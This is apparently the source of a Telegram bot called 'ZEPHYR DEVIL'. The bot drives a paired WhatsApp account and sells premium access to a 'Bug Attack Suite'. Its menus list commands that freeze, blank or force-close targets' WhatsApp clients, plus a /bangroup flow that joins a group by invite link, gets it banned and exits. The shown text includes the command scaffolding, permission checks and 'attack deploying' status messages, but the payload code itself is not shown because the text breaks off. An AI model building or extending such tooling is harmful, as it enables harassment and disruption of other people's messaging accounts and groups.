import fs from "fs"
import path from "path"
import chalk from "chalk"
import https from "https"
import crypto from "crypto"
import { execSync } from "child_process"

import { Telegraf, RichMessage, Markup } from "@icanseeuanywhere/telekaf"
import { message, callbackQuery } from "@icanseeuanywhere/telekaf/filters"

import * as baileysPkg from "@sakataoffc/baileys"

const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  generateMessageTag,
  areJidsSameUser,
  downloadAndSaveMediaMessage,
  getContentType,
  useSingleFileAuthState,
  BufferJSON,
  proto,
  jidDecode,
  mentionedJid,
  Browser,
  MessageType,
  Presence,
  Mimetype,
  relayWAMessage,
  Browsers,
  DisconnectReason,
  getStream,
  WAProto,
  isBaileys,
  fetchLatestBaileysVersion
} = baileysPkg

import pino from "pino"
import axios from "axios"
import FormData from "form-data"
import config from "./config.js"

const { RichHTMLBuilder: HTML } = RichMessage
const BOT_TOKEN = config.TOKEN_GINXJAL
const CONFIG_OWNER_IDS = (config.OWNER_IDS || []).map(String)

const SYSTEM = Object.freeze({
  NAME: "ZEPHYR DEVIL",
  VERSION: "4.0.0",
  GEN: "Gen 1",
  AUTHOR: "@Skyzael",
  TIMEZONE: "Asia/Jakarta",
  STATUS: "🟢 Online"
})

const GITHUB = Object.freeze({
  OWNER: "alexapp-build",
  REPO: "zephyrup",
  BRANCH: "main",
  TOKEN: process.env.GITHUB_TOKEN || "",
  API_BASE: "https://api.github.com",
  RAW_BASE: "https://raw.githubusercontent.com"
})

const EMOJI = Object.freeze({
  BRAND: "5226513232549664618",
  SUCCESS: "5260726538302660868",
  ERROR: "5260280853841321805",
  WARNING: "5260293700088511294",
  LOADING: "5258420634785947640",
  SECURITY: "5258476306152038031",
  UPDATE: "5260652420052032852",
  SYSTEM: "5258096772776991776",
  MENU: "5257965174979042426",
  PREMIUM: "5258185631355378853",
  DATABASE: "5258134813302332906",
  NETWORK: "5258115571848846212",
  VERSION: "5258328383183396223"
})

const SLIDESHOW_IMAGES = [
  "https://files.catbox.moe/fnh7v2.jpg",
  "https://files.catbox.moe/hpwlj7.jpg"
]

const PATHS = Object.freeze({
  MODE: "./Tools/mode.json",
  GROUP_MODE: "./Tools/groupmode.json",
  ANTI_FOTO: "./Tools/antifoto.json",
  ANTI_VIDEO: "./Tools/antivideo.json",
  SAFE_GROUPS: "./Tools/safeGroups.json",
  PREMIUM_GROUPS: "./Tools/premiumGroups.json",
  PREMIUM_USER: "./database/premiumuser.json",
  ADMIN_USER: "./database/adminuser.json",
  OWNER_USER: "./database/owneruser.json",
  SESSION: "./session",
  BACKUP_DIR: "./backups",
  HISTORY: "./updateHistory.json",
  LAST_NOTIFIED: "./lastNotifiedCommit.json",
  PENDING_NOTIF: "./pending_update_notification.json"
})

const UPDATE_INTERVAL_MS = 6 * 60 * 60 * 1000

let sock = null
let isWhatsAppConnected = false
let linkedWhatsAppNumber = ""
let isStarting = false
let reconnectAttempts = 0
let pairingMessage = null
let schedulerInterval = null
let updateInProgress = false

const MAX_RECONNECT = 10
const pendingGroups = new Map()
const cooldowns = new Map()

let currentMode = "self"
let currentGroupMode = "off"
let antiCulik = true
let autoReject = false
let antiFotoGroups = []
let antiVideoGroups = []
let whitelistGroups = []
let premiumUsers = []
let ownerUsers = []
let adminList = []
let premiumGroups = []
let COOLDOWN_TIME = 1000
let COOLDOWN_TEXT = "1s"

function emo(id, fallback) {
  return `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`
}

function sleep(ms) { return new Promise((r) => setTimeout(r, ms)) }

function runtime(sec) {
  sec = Number(sec)
  const h = Math.floor(sec / 3600)
  const m = Math.floor((sec % 3600) / 60)
  const s = Math.floor(sec % 60)
  return `${h}h ${m}m ${s}s`
}

function loadJSON(file, fallback = []) {
  try {
    if (!fs.existsSync(file)) return fallback
    const data = fs.readFileSync(file, "utf8")
    if (!data) return fallback
    return JSON.parse(data)
  } catch { return fallback }
}

function saveJSON(file, data) {
  try {
    const dir = path.dirname(file)
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true })
    fs.writeFileSync(file, JSON.stringify(data, null, 2))
  } catch (e) { console.log(chalk.red(`Save error [${file}]: ${e.message}`)) }
}

function refreshState() {
  const storedOwners = loadJSON(PATHS.OWNER_USER, []).map(String)
  const merged = new Set([...CONFIG_OWNER_IDS, ...storedOwners])
  ownerUsers = [...merged]
  premiumUsers = loadJSON(PATHS.PREMIUM_USER, []).map(String)
  adminList = loadJSON(PATHS.ADMIN_USER, []).map(String)
  premiumGroups = loadJSON(PATHS.PREMIUM_GROUPS, []).map(String)
  whitelistGroups = loadJSON(PATHS.SAFE_GROUPS, []).map(String)
  antiFotoGroups = loadJSON(PATHS.ANTI_FOTO, []).map(String)
  antiVideoGroups = loadJSON(PATHS.ANTI_VIDEO, []).map(String)
  currentMode = loadJSON(PATHS.MODE, { mode: "self" }).mode || "self"
  currentGroupMode = loadJSON(PATHS.GROUP_MODE, { group: "off" }).group || "off"
}

function isOwner(id) { return ownerUsers.includes(String(id)) }
function isAdmin(id) { return adminList.includes(String(id)) || isOwner(id) }
function isPremium(id) { return premiumUsers.includes(String(id)) }
function isGroupPremium(id) { return premiumGroups.includes(String(id)) }

function checkOwner(ctx, next) {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply(`${emo(EMOJI.ERROR, "❌")} <b>Owner Access Required</b>\n<i>Contact: ${SYSTEM.AUTHOR}</i>`, { parse_mode: "HTML" })
  }
  return next()
}

function checkAdmin(ctx, next) {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply(`${emo(EMOJI.ERROR, "❌")} <b>Admin Access Required</b>\n<i>Contact: ${SYSTEM.AUTHOR}</i>`, { parse_mode: "HTML" })
  }
  return next()
}

function checkPremium(ctx, next) {
  if (isOwner(ctx.from.id)) return next()
  if (isPremium(ctx.from.id)) return next()
  if (ctx.chat.type !== "private" && isGroupPremium(ctx.chat.id)) return next()
  return ctx.reply(`${emo(EMOJI.ERROR, "❌")} <b>Premium Access Required</b>`, { parse_mode: "HTML" })
}

function checkWA(ctx, next) {
  if (!isWhatsAppConnected) {
    return ctx.reply(`🪧 <b>Sender tidak terhubung</b>\n<i>Gunakan /connect dulu untuk menghubungkan sender.</i>`, { parse_mode: "HTML" })
  }
  return next()
}

function checkCooldown(ctx, next) {
  if (!ctx.from?.id) return next()
  if (isOwner(ctx.from.id)) return next()
  if (COOLDOWN_TIME === 0) return next()
  const uid = String(ctx.from.id)
  const now = Date.now()
  const exp = cooldowns.get(uid) || 0
  if (now < exp) {
    if (!cooldowns.get(uid + "_msg")) {
      cooldowns.set(uid + "_msg", true)
      setTimeout(() => cooldowns.delete(uid + "_msg"), 3000)
      return ctx.reply(`⏳ <b>Tunggu ${COOLDOWN_TEXT}!</b>`, { parse_mode: "HTML" })
    }
    return
  }
  cooldowns.set(uid, now + COOLDOWN_TIME)
  return next()
}

function extractInviteCode(input) {
  if (!input) return null
  const trimmed = input.trim()
  if (trimmed.includes("chat.whatsapp.com/")) {
    const code = trimmed.split("chat.whatsapp.com/")[1].split(/[?/\s]/)[0].trim()
    return code || null
  }
  if (/^[A-Za-z0-9]{15,}$/.test(trimmed)) return trimmed
  return null
}

async function startSesi() {
  try {
    if (isStarting) return
    isStarting = true
    console.log(chalk.cyan("🔗 Menghubungkan WhatsApp..."))

    if (sock?.ev) {
      try { sock.ev.removeAllListeners("connection.update") } catch {}
      try { sock.ev.removeAllListeners("creds.update") } catch {}
    }

    const { state, saveCreds } = await useMultiFileAuthState(PATHS.SESSION)
    const { version } = await fetchLatestBaileysVersion()

    sock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      keepAliveIntervalMs: 25000,
      connectTimeoutMs: 60000,
      markOnlineOnConnect: true,
      emitOwnEvents: true,
      fireInitQueries: true
    })

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async (u) => {
      const { connection, lastDisconnect } = u
      const reason = lastDisconnect?.error?.output?.statusCode

      if (connection === "connecting") console.log(chalk.yellow("🔄 Connecting..."))

      if (connection === "open") {
        isWhatsAppConnected = true
        isStarting = false
        reconnectAttempts = 0
        linkedWhatsAppNumber = sock.user?.id?.split(":")[0]
        console.log(chalk.green(`✅ WhatsApp: ${linkedWhatsAppNumber}`))
        if (pairingMessage) {
          try {
            await bot.telegram.editMessageCaption(
              pairingMessage.chatId,
              pairingMessage.messageId,
              undefined,
              `✅ WhatsApp Berhasil Terhubung\n📱 Nomor: ${linkedWhatsAppNumber}`
            )
          } catch {}
          pairingMessage = null
        }
      }

      if (connection === "close") {
        isWhatsAppConnected = false
        isStarting = false
        console.log(chalk.red(`❌ Disconnected: ${reason}`))
        if (reason === DisconnectReason.loggedOut || reason === 401) {
          deleteSession()
          pairingMessage = null
          return
        }
        reconnectAttempts++
        if (reconnectAttempts > MAX_RECONNECT) {
          console.log(chalk.red("⏹ Reconnect limit reached"))
          return
        }
        const delay = Math.min(5000 * reconnectAttempts, 30000)
        setTimeout(startSesi, delay)
      }
    })
  } catch (e) {
    console.log(chalk.red("startSesi error:"), e)
    isStarting = false
  }
}

function deleteSession() {
  try {
    if (fs.existsSync(PATHS.SESSION)) fs.rmSync(PATHS.SESSION, { recursive: true, force: true })
    return true
  } catch { return false }
}

const bot = new Telegraf(BOT_TOKEN)

bot.use((ctx, next) => {
  if (currentGroupMode === "on" && ctx.chat?.type === "private") {
    return ctx.reply("🔒 <b>GROUP ONLY MODE</b>\n\nBot ini hanya bisa digunakan di dalam group.", { parse_mode: "HTML" })
  }
  return next()
})

bot.use((ctx, next) => {
  if (currentMode === "self" && ctx.from && !isOwner(ctx.from.id)) {
    if (ctx.callbackQuery) return ctx.answerCbQuery("🔒 BOT DI KUNCI OWNER", { show_alert: true })
    return
  }
  return next()
})

function slideshowLine() {
  return SLIDESHOW_IMAGES.map(url => `<img src="${url}"/>`)
}

function buildHomeMessage(ctx) {
  const userId = String(ctx.from.id)
  const username = ctx.from.username ? `@${ctx.from.username}` : (ctx.from.first_name || "User")
  const waStatus = isWhatsAppConnected ? "🟢 Connected" : "🔴 Disconnected"

  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ ZEPHYR DEVIL ✦")
    .paragraph(HTML.italic("Premium Bug Bot • Rich Edition"))
    .divider()
    .heading(2, "◈ SYSTEM INFO")
    .table(
      [
        ["Identifier", "Value"],
        ["Developer", "Alex Sander"],
        ["Version", "4.0 Gen 1"],
        ["Platform", "Telegram"],
        ["Type Script", "No Spam"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ USER PROFILE")
    .table(
      [
        ["Field", "Value"],
        ["User ID", userId],
        ["Username", username],
        ["Connection", waStatus]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ SYSTEM STATUS")
    .taskList(
      { text: "WhatsApp Sender aktif", checked: isWhatsAppConnected },
      { text: "Bot Telegram online", checked: true },
      { text: "Session tersimpan aman", checked: fs.existsSync(PATHS.SESSION) },
      { text: "Anti-expired protection", checked: true }
    )
    .divider()
    .heading(2, "◈ AVAILABLE FEATURES")
    .taskList(
      { text: "XBUGS — Premium Bug Attack Suite", checked: true },
      { text: "XSETTINGS — System Control Panel", checked: true },
      { text: "DEVELOPERS — Team & Contributors", checked: true },
      { text: "TQTO — Special Thanks", checked: true }
    )
    .divider()
    .blockQuote(
      HTML.italic("Welcome to the premium experience. Choose your destination below.") +
      "<br>— " + HTML.bold(SYSTEM.AUTHOR)
    )
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildBugMessage() {
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ XBUGS DEPLOYMENT ✦")
    .paragraph(HTML.italic("Premium Bug Attack Suite • All-in-One"))
    .divider()
    .heading(2, "◈ INVISIBLE BUG")
    .table(
      [
        ["Command", "Type", "Cooldown"],
        ["/1F", "Delay X Freeze 1 Hit", "7 min"],
        ["/2F", "Delay X Freeze V1", "5 min"],
        ["/3F", "Delay X Freeze V2", "5 min"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ SPESIAL MURBUG")
    .table(
      [
        ["Command", "Type", "Cooldown"],
        ["/1D", "Delay Hard New", "1 min"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ VISIBLE BUG")
    .table(
      [
        ["Command", "Type", "Cooldown"],
        ["/1B", "Blank Andro New", "3 min"],
        ["/Xangel", "Force Close No Click", "1 min"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ GROUP BAN SUITE")
    .table(
      [
        ["Command", "Function", "Flow"],
        ["/bangroup", "Ban Group via Link", "Join → Ban → Out"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ DEPLOYMENT CHECKLIST")
    .taskList(
      { text: "Target nomor/link sudah siap", checked: true },
      { text: "WhatsApp sender terhubung", checked: isWhatsAppConnected },
      { text: "Command sesuai tipe device", checked: true },
      { text: "Cooldown sudah dipatuhi", checked: false },
      { text: "Tidak abuse (risiko ban)", checked: false }
    )
    .divider()
    .blockQuote(
      HTML.italic("Deploy with responsibility. All risks are on the user.") +
      "<br>— " + HTML.bold(SYSTEM.AUTHOR)
    )
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildSettingsMessage() {
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ XSETTINGS PANEL ✦")
    .paragraph(HTML.italic("Full System Control Center"))
    .divider()
    .heading(2, "◈ SYSTEM CONTROL")
    .table(
      [
        ["Command", "Function"],
        ["/connect", "Connect WhatsApp Sender"],
        ["/delpair", "Delete Pair Session"],
        ["/killsesi", "Kill Active Session"],
        ["/runtime", "Runtime & Memory Info"],
        ["/mode", "Bot Mode Configuration"],
        ["/status", "Sender Status Report"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ PREMIUM MANAGEMENT")
    .table(
      [
        ["Command", "Function"],
        ["/addprem", "Add Premium User"],
        ["/delprem", "Delete Premium User"],
        ["/addgroupremium", "Add Group Premium"],
        ["/delgroupremium", "Delete Group Premium"],
        ["/cekpremium", "Check Premium Status"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ USER & ADMIN")
    .table(
      [
        ["Command", "Function"],
        ["/list", "Full User List"],
        ["/addadmin", "Add New Admin"],
        ["/deladmin", "Delete Admin"],
        ["/cekowner", "Owner Information"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ SECURITY SUITE")
    .table(
      [
        ["Command", "Function"],
        ["/anticulik", "Anti-Culik Protection"],
        ["/addsafe", "Add Safe Group"],
        ["/delsafe", "Remove Safe Group"],
        ["/antifoto", "Anti Photo Protection"],
        ["/antivideo", "Anti Video Protection"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ GROUP & SYSTEM")
    .table(
      [
        ["Command", "Function"],
        ["/groupon", "Group Only Mode ON"],
        ["/groupoff", "Group Only Mode OFF"],
        ["/setcd", "Set Command Cooldown"],
        ["/self", "Self Mode (Owner Only)"],
        ["/public", "Public Mode (Everyone)"],
        ["/update", "Update Bot System"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .blockQuote(HTML.italic("Configure your system with precision."))
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildDevelopersMessage() {
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ DEVELOPERS TEAM ✦")
    .paragraph(HTML.italic("The Minds Behind Zephyr Devil"))
    .divider()
    .heading(2, "◈ CORE TEAM")
    .table(
      [
        ["Role", "Contact", "Status"],
        ["Lead Developer", "@Skyzael", "🟢 Active"],
        ["Co-Developer", "@nightshadeeeee", "🟢 Active"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .blockQuote(
      HTML.italic("Every line of code, every test, every feedback — thank you all.") +
      "<br>— " + HTML.bold(SYSTEM.AUTHOR)
    )
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildTqtoMessage() {
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ THANK YOU TO ✦")
    .paragraph(HTML.italic("Special Credits & Appreciation"))
    .divider()
    .heading(2, "◈ CREATOR")
    .table(
      [
        ["Role", "Contact"],
        ["Creator", "@Skyzael"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ FRIENDS")
    .table(
      [
        ["Name", "Contact"],
        ["Friend", "@nightshadeeeee"],
        ["Friend", "@ALFA21L"],
        ["Friend", "@Sirgixsz"],
        ["Friend", "@pherine"],
        ["Friend", "@RenaOffc"],
        ["Friend", "@hpuspsan"],
        ["Friend", "@usnmaklau"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .blockQuote(
      HTML.italic("Kalian semua adalah bagian dari perjalanan ini.") +
      "<br>— " + HTML.bold("Zephyr Devil Team")
    )
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildStatusMessage() {
  const waStatus = isWhatsAppConnected ? "🟢 Connected" : "🔴 Disconnected"
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ SENDER STATUS ✦")
    .divider()
    .heading(2, "◈ CONNECTION INFO")
    .table(
      [
        ["Field", "Value"],
        ["WhatsApp", waStatus],
        ["Phone Number", linkedWhatsAppNumber || "—"],
        ["Bot Mode", currentMode.toUpperCase()],
        ["Group Mode", currentGroupMode.toUpperCase()],
        ["Uptime", runtime(process.uptime())]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildRuntimeMessage() {
  const up = process.uptime()
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ RUNTIME INFO ✦")
    .divider()
    .heading(2, "◈ PERFORMANCE")
    .table(
      [
        ["Item", "Value"],
        ["Hours", String(Math.floor(up / 3600))],
        ["Minutes", String(Math.floor((up % 3600) / 60))],
        ["Seconds", String(Math.floor(up % 60))],
        ["Total Uptime", runtime(up)],
        ["Memory Usage", `${(process.memoryUsage().rss / 1024 / 1024).toFixed(0)} MB`],
        ["Node Version", process.version]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildModeMessage() {
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ BOT MODE ✦")
    .divider()
    .heading(2, "◈ CURRENT CONFIGURATION")
    .table(
      [
        ["Setting", "Status"],
        ["Bot Mode", currentMode.toUpperCase()],
        ["Group Mode", currentGroupMode.toUpperCase()],
        ["Cooldown", COOLDOWN_TEXT],
        ["Anti-Culik", antiCulik ? "✅ Active" : "❌ Inactive"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildOwnerInfoMessage(ctx) {
  const list = ownerUsers.length ? ownerUsers.map((id, i) => [String(i + 1), id]) : [["-", "-"]]
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ OWNER INFO ✦")
    .divider()
    .heading(2, "◈ YOUR ID")
    .paragraph(`User ID: ${HTML.code(String(ctx.from.id))}`)
    .divider()
    .heading(2, `◈ OWNER LIST (${ownerUsers.length})`)
    .table([["No", "User ID"], ...list], { bordered: true, striped: true, hasHeader: true })
    .divider()
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildPremiumCheckMessage(ctx) {
  const uid = String(ctx.from.id)
  const isPrem = isPremium(uid)
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ PREMIUM STATUS ✦")
    .divider()
    .heading(2, "◈ YOUR STATUS")
    .table(
      [
        ["Field", "Value"],
        ["User ID", uid],
        ["Premium Access", isPrem ? "✅ Active" : "❌ Inactive"],
        ["Access Level", isPrem ? "Premium User" : "Regular User"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .blockQuote(
      HTML.italic(isPrem ? "Welcome to premium experience!" : "Upgrade to premium for more features.")
    )
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildUserListMessage() {
  const premRows = premiumUsers.length ? premiumUsers.map((id, i) => [String(i + 1), id]) : [["-", "-"]]
  const admRows = adminList.length ? adminList.map((id, i) => [String(i + 1), id]) : [["-", "-"]]
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ USER LIST ✦")
    .divider()
    .heading(2, `◈ PREMIUM USERS (${premiumUsers.length})`)
    .table([["No", "User ID"], ...premRows], { bordered: true, striped: true, hasHeader: true })
    .divider()
    .heading(2, `◈ ADMIN USERS (${adminList.length})`)
    .table([["No", "User ID"], ...admRows], { bordered: true, striped: true, hasHeader: true })
    .divider()
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildToolsMessage() {
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ TOOLS SUITE ✦")
    .paragraph(HTML.italic("Complete Utility Toolkit"))
    .divider()
    .heading(2, "◈ MEDIA & CONVERT")
    .table(
      [
        ["Command", "Function"],
        ["/brat", "Brat Text Maker"],
        ["/catbox", "Catbox Downloader"],
        ["/catboxurl", "Photo → URL Upload"],
        ["/convert", "Media Converter"],
        ["/hd", "HD Image Enhancer"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ DOWNLOADER")
    .table(
      [
        ["Command", "Function"],
        ["/tiktokdl", "TikTok Downloader"],
        ["/snack", "SnackVideo Downloader"],
        ["/lagu", "Music Search"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ UTILITY")
    .table(
      [
        ["Command", "Function"],
        ["/time", "Indonesia Time Zones"],
        ["/cuaca", "Weather Check"],
        ["/ssiphone", "iPhone Theme Screenshot"],
        ["/encjs", "Encrypt JavaScript"],
        ["/decjs", "Decrypt JavaScript"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ FUN & RANDOM")
    .table(
      [
        ["Command", "Function"],
        ["/jodoh", "Love Compatibility"],
        ["/koin", "Coin Flip"],
        ["/suit", "Rock Paper Scissors"],
        ["/motivasi", "Daily Motivation"],
        ["/shio", "Zodiac Fortune"],
        ["/tebak", "Number Guessing Game"],
        ["/kepribadian", "Personality Test"],
        ["/karir", "Future Career"],
        ["/level", "Attractiveness Level"],
        ["/harilahir", "Birth Day Guess"],
        ["/cekmasadepan", "Future Prediction"],
        ["/ramal", "Name Fortune"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildPairingMessage(phone, code) {
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ PAIRING REQUEST ✦")
    .paragraph(HTML.italic("Link your WhatsApp to Zephyr Devil"))
    .divider()
    .heading(2, "◈ PAIRING CODE")
    .table(
      [
        ["Field", "Value"],
        ["Phone Number", phone],
        ["Pairing Code", code],
        ["Status", "🟡 Pending Connection"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ INSTRUCTIONS")
    .taskList(
      { text: "Buka WhatsApp di HP kamu", checked: false },
      { text: "Menu → Linked Devices", checked: false },
      { text: "Pilih 'Link with phone number'", checked: false },
      { text: "Masukkan kode di atas", checked: false },
      { text: "Tunggu sampai tersambung", checked: false }
    )
    .divider()
    .blockQuote(
      HTML.italic("Jika gagal pairing, hapus session dengan /killsesi lalu /connect lagi.")
    )
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildBugExecMessage(title, target, type, cmd) {
  const time = new Date().toLocaleTimeString("id-ID")
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, `✦ ${title} ✦`)
    .paragraph(HTML.italic("Bug attack in progress"))
    .divider()
    .heading(2, "◈ EXECUTION INFO")
    .table(
      [
        ["Field", "Value"],
        ["Target", target],
        ["Type", type],
        ["Command", cmd],
        ["Time", time],
        ["Status", "✅ Success"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ SYSTEM STATUS")
    .taskList(
      { text: "WhatsApp sender connected", checked: isWhatsAppConnected },
      { text: "Payload initialized", checked: true },
      { text: "Attack deploying", checked: true },
      { text: "Loop process running", checked: true }
    )
    .divider()
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildBanProcessingMessage(link) {
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ BAN GROUP DEPLOYMENT ✦")
    .paragraph(HTML.italic("Auto Join → Ban → Exit"))
    .divider()
    .heading(2, "◈ PROCESS INFO")
    .table(
      [
        ["Step", "Status"],
        ["Step 1 — Join Group", "🟡 Processing"],
        ["Step 2 — Get Group ID", "⏳ Waiting"],
        ["Step 3 — Execute Ban", "⏳ Waiting"],
        ["Step 4 — Leave Group", "⏳ Waiting"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ TARGET LINK")
    .paragraph(HTML.code(link))
    .divider()
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildBanJoinedMessage(groupJid, groupName) {
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ BAN GROUP DEPLOYMENT ✦")
    .paragraph(HTML.italic("Successfully joined group — deploying attack"))
    .divider()
    .heading(2, "◈ PROCESS STATUS")
    .table(
      [
        ["Step", "Status"],
        ["Step 1 — Join Group", "✅ Success"],
        ["Step 2 — Get Group ID", "✅ Success"],
        ["Step 3 — Execute Ban", "🟡 In Progress"],
        ["Step 4 — Leave Group", "⏳ Waiting"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ TARGET INFO")
    .table(
      [
        ["Field", "Value"],
        ["Group Name", groupName || "Unknown"],
        ["Group JID", groupJid]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildBanSuccessMessage(groupJid, groupName) {
  const time = new Date().toLocaleTimeString("id-ID")
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ BAN GROUP SUCCESS ✦")
    .paragraph(HTML.italic("Operation completed successfully"))
    .divider()
    .heading(2, "◈ PROCESS STATUS")
    .table(
      [
        ["Step", "Status"],
        ["Step 1 — Join Group", "✅ Success"],
        ["Step 2 — Get Group ID", "✅ Success"],
        ["Step 3 — Execute Ban", "✅ Success"],
        ["Step 4 — Leave Group", "✅ Success"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, "◈ TARGET INFO")
    .table(
      [
        ["Field", "Value"],
        ["Group Name", groupName || "Unknown"],
        ["Group JID", groupJid],
        ["Completed At", time]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .blockQuote(HTML.italic("Group has been banned and exited successfully."))
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildBanFailMessage(link, error) {
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ BAN GROUP FAILED ✦")
    .paragraph(HTML.italic("Operation could not be completed"))
    .divider()
    .heading(2, "◈ ERROR INFO")
    .table(
      [
        ["Field", "Value"],
        ["Target Link", link.slice(0, 40)],
        ["Error", String(error).slice(0, 100)],
        ["Status", "❌ Failed"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .blockQuote(
      HTML.italic("Pastikan link grup valid dan sender WhatsApp terhubung.")
    )
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildUpdateAvailable(remote) {
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ UPDATE AVAILABLE ✦")
    .divider()
    .heading(2, "◈ NEW VERSION")
    .table(
      [
        ["Field", "Value"],
        ["Current Version", getLocalVersion()],
        ["New Commit", remote.sha.slice(0, 7)],
        ["Message", remote.message.slice(0, 60)],
        ["Author", remote.author]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .paragraph("Ketik /updateconfirm untuk memulai update.")
    .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
    .build()
}

function buildUpdateUpToDate(remote) {
  return new HTML()
    .slideshow(...slideshowLine())
    .heading(1, "✦ SYSTEM UP TO DATE ✦")
    .divider()
    .heading(2, "◈ LATEST VERSION")
    .table(
      [
        ["Field", "Value"],
